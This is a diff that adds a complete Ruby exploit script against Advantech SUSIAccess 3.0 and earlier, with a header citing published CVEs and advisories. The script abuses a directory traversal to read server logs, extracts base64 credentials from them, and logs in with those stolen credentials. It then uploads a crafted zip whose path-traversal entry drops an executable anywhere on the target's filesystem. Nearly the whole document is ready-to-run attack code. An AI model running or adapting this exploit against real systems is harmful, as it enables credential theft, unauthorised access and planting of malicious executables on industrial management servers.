@@ -1,0 +1,219 @@
+#! /usr/bin/env ruby
+
+=begin
+Exploit Title: Advantech SUSIAccess RecoveryMgmt File Upload
+Date: 07/31/17
+Exploit Author: james fitts 
+Vendor Homepage: http://www.advantech.com/
+Version: Advantech SUSIAccess <= 3.0
+Tested on: Windows 7 SP1
+Relavant Advisories:
+	ZDI-16-630
+	ZDI-16-628
+	CVE-2016-9349
+	CVE-2016-9351
+	BID-94629
+	ICSA-16-336-04
+
+Notes:
+	This PoC will upload AcronisInstaller.exe to the root of C:\
+	You can modify this to drop files where ever you want on the
+	filesystem.
+
+	By default the script will use the directory traversal vuln
+	to pull down the log files and parse for the base64 encoded
+	credentials. Once it has that, it will use them to log into
+	the application and upload the malicious zip file.
+=end
+
+require 'mime/types'
+require 'fileutils'
+require 'net/http'
+require 'nokogiri'
+require 'base64'
+require 'digest'
+require 'date'
+require 'uri'
+require 'zip'
+
+def uploadZip(target, creds, cookies)
+	uri = URI("http://#{target}:8080/webresources/RecoveryMgmt/upload")
+	bound = "AaBbCcDdEe"
+
+	path = Dir.pwd
+	zipfile = "#{path}/update.zip"
+
+	post_data = []
+	post_data << "--#{bound}\r\n"
+	post_data << "Content-Disposition: form-data; name=\"frmUpdateSetting_Acronis_LastUpdateName\""
+	post_data << "\r\n\r\n\r\n"
+	post_data << "--#{bound}\r\n"
+	post_data << "Content-Disposition: form-data; name=\"frmUpdateSetting_Acronis_UploadFileFullName\""
+	post_data << "\r\n\r\nupdate.zip\r\n"
+	post_data << "--#{bound}\r\n"
+	post_data << "Content-Disposition: form-data; name=\"frmUpdateSetting_Acronis_Content\""
+	post_data << "\r\n\r\n"
+	post_data << "<request Authorization=\"#{creds[0].to_s}\"/>\r\n"
+	post_data << "--#{bound}\r\n"
+	post_data << "Content-Disposition: form-data; name=\"frmUpdateSetting_Acronis_FileInput\"; filename=\"update.zip\""
+	post_data << "\r\nContent-Type: application/zip"
+	post_data << "\r\n\r\n"
+	post_data << File.read(zipfile)
+	post_data << "\r\n\r\n--#{bound}--\r\n"
+
+	req = Net::HTTP::Post.new(uri, initheader = {
+			'Cookie'						=>	cookies,
+			'Authorization'			=>	"Basic #{creds[0].to_s}",
+			'X-Requested-With'	=>	"XMLHttpRequest",
+			'Content-Type'			=>	"multipart/form-data; boundary=#{bound}",
+			'User-Agent'				=>	"Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0",
+			'Accept-Language'		=>	"en-US,en;q=0.5",
+			'Accept'						=>	"text/plain, */*; q=0.01",
+			'Connection'				=>	"close"
+	})
+
+	req.body = post_data.join
+
+	http = Net::HTTP.new("#{target}", 8080)
+	res = http.start {|http| http.request(req)}
+
+	if res.code =~ /200/
+		puts "[+] Upload successful!"
+	end
+end
+
+def craftZip(target, payload)
+	path = "../../../../../../../../../../Program%20Files\\Advantech\\SUSIAccess%203.0%20Server\\Setting.xml"
+
+	uri = URI("http://#{target}:8080/downloadCSV.jsp?file=#{path}")
+	res = Net::HTTP.get_response(uri)
+	xml = Nokogiri::XML(res.body)
+	ver = xml.xpath('//setting/Configuration/ThridParty/Acronis/version').to_s.split("=")[1].split("\"")[1]
+	kern_ver = xml.xpath('//setting/Configuration/ThridParty/Acronis/kernal_version').to_s.split("=")[1].split("\"")[1]
+
+	# version information doesn't matter
+	# the application will still extract the zip
+	# file regardless of whether or not its
+	# a greater version or lesser
+	f = File.open("LatestVersion.txt", 'w')
+	f.puts("Installer Version: #{ver}\r\nApplication Version: #{kern_ver}")
+	f.close
+
+	f = File.open("md5.txt", 'w')
+	md5 = Digest::MD5.hexdigest(File.read("AcronisInstaller.exe"))
+	f.puts md5
+	f.close
+
+	path = Dir.pwd
+	zipfile = "#{path}/update.zip"
+
+	if File.exist?(zipfile)
+		FileUtils.rm(zipfile)
+	end
+
+	files = ["AcronisInstaller.exe", "LatestVersion.txt", "md5.txt"]
+
+	levels = "../" * 10
+	Zip::File.open(zipfile, Zip::File::CREATE) do |zip|
+		files.each do |fname|
+			if fname == "AcronisInstaller.exe"
+				zip.add("#{levels}#{fname}", fname)
+			end
+			zip.add(fname, fname)
+		end
+	end
+
+	if File.exist?(zipfile)
+		puts "[!] Malicious zip created successfully"
+	end
+end
+
+def doLogin(target, creds)
+	formattedDate = DateTime.now.strftime("%a %b %d %Y %H:%M:%S GMT-0400 (EDT)")
+	formattedDate = URI::encode(formattedDate)
+
+	uri = URI("http://#{target}:8080/frmServer.jsp?d=#{formattedDate}")
+
+	res = Net::HTTP.get_response(uri)
+	jsessid = res.header['Set-Cookie'].split(';')[0]
+	cookies = "deviceType=pc; log4jq=OFF; selectedLang=en_US; #{jsessid}"
+
+	uname = Base64.decode64(creds[0].to_s).split(":")[0]
+	pass = Base64.decode64(creds[0].to_s).split(":")[1]
+
+	data = "<request Authorization=\"#{creds[0].to_s}\">"
+	data << "<item name=\"username\" value=\"#{uname}\"/>"
+	data << "<item name=\"password\" value=\"#{pass}\"/>"
+	data << "</request>"
+
+	puts "[+] Attempting login with pilfered credentials now"
+	uri = URI("http://#{target}:8080/webresources/AccountMgmt/Login")
+
+	req = Net::HTTP::Post.new(uri, initheader = {
+		'Content-Type'      =>  "application/xml",
+		'Cookies'           =>  cookies,
+		'Authorization'     =>  "Basic #{creds[0].to_s}",
+		'X-Requested-With'  =>  'XMLHttpRequest'
+	})
+
+	req.body = data
+
+	http = Net::HTTP.new("#{target}", 8080)
+	res = http.start {|http| http.request(req)}
+
+	if res.body =~ /<result><role name/
+		puts "[+] Login successful!"
+		return cookies
+	else
+		puts "[-] Something went wrong..."
+	end
+	
+end
+
+def getCreds(target)
+	cnt = 1
+	d = Date.today
+	d.strftime("%y-%m-%d")
+	creds = []
+
+	while cnt < 31
+		fdate = d - cnt
+		cnt += 1
+
+		path = "../../../../../../../../../../Program Files\\Apache Software Foundation\\logs\\"
+		file = "localhost_access_log.#{fdate}.txt"
+		full_path = path + file
+
+		uri = URI("http://#{target}:8080/downloadCSV.jsp?file=#{full_path}")
+
+		res = Net::HTTP.get_response(uri)
+
+		if res.code =~ /200/
+			creds << res.body.scan(/(?<=Authorization=%22)[A-Za-z0-9=]+/)
+		end
+	end
+	return creds.flatten.uniq
+end
+
+##
+# Main
+##
+if ARGV.length != 1
+	puts "Usage:\r\n\truby #{$0} [TARGET IP]"
+else
+	target = ARGV[0]
+	payload = "AcronisInstaller.exe"
+	
+	puts "[+] Extracting credentials now..."
+	credentials = getCreds(target)
+	if credentials.length > 0
+		puts "[!] Credentials found!"
+		cookies = doLogin(target, credentials)
+		puts "[+] Crafting malicious zip now..."
+		craftZip(target, payload)
+		uploadZip(target, credentials, cookies)
+	else
+		puts "[-] Credentials not found.. Try searching for more log files.."
+		exit
+	end
+end
